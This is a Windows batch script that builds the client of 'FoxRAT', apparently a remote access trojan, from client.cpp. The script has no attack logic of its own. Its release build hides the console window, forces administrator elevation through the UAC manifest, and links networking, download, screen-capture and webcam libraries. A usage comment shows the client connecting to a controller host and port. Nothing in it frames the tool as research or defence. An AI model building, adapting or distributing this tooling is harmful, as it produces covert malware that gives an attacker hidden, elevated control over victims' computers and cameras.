@echo off
chcp 65001 >nul

REM ===== FoxRAT Client Build Script =====
REM Detects Visual Studio automatically - run from ANY cmd/powershell
REM
REM Usage:
REM   build.bat              - Debug build (console visible)
REM   build.bat release      - Release build (no console, optimized)
REM   build.bat debug        - Same as default
REM   build.bat clean        - Delete build artifacts
REM
REM Client args:
REM   FoxRAT.exe -host 192.168.1.100 -port 3000

set OUTDIR=..
if /i "%1"=="clean" (
    del /f /q "%OUTDIR%\FoxRAT.exe" "%OUTDIR%\FoxRAT_dbg.exe" *.obj *.ilk *.pdb 2>nul
    echo [OK] Cleaned
    exit /b
)

REM Auto-detect Visual Studio
set VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe
if not exist "%VSWHERE%" set VSWHERE=%ProgramFiles%\Microsoft Visual Studio\Installer\vswhere.exe

if exist "%VSWHERE%" (
    for /f "usebackq tokens=*" %%i in (`"%VSWHERE%" -latest -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do set VSINST=%%i
    if defined VSINST call "%VSINST%\VC\Auxiliary\Build\vcvarsall.bat" x64
)

where cl.exe >nul 2>&1
if errorlevel 1 (
    echo [FAIL] cl.exe not found
    echo Install VS Build Tools or run from Developer Command Prompt.
    pause
    exit /b 1
)

set common=/nologo /EHa /W3 /std:c++17 /D_SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
set libs=user32.lib gdi32.lib ws2_32.lib winmm.lib urlmon.lib advapi32.lib ole32.lib oleaut32.lib gdiplus.lib iphlpapi.lib winhttp.lib shell32.lib vfw32.lib

if /i "%1"=="release" (
    echo [BUILD] Release...
    cl %common% /O2 /MT /GL client.cpp /Fe"%OUTDIR%\FoxRAT.exe" /link /SUBSYSTEM:WINDOWS /LTCG /MANIFESTUAC:"level='requireAdministrator' uiAccess='false'" %libs%
) else (
    echo [BUILD] Debug...
    cl %common% /Od /MTd /Zi client.cpp /Fe"%OUTDIR%\FoxRAT_dbg.exe" /link /SUBSYSTEM:CONSOLE %libs%
)

if %errorlevel% equ 0 (
    echo [OK] Build successful
) else (
    echo [FAIL] Build failed
    pause
)
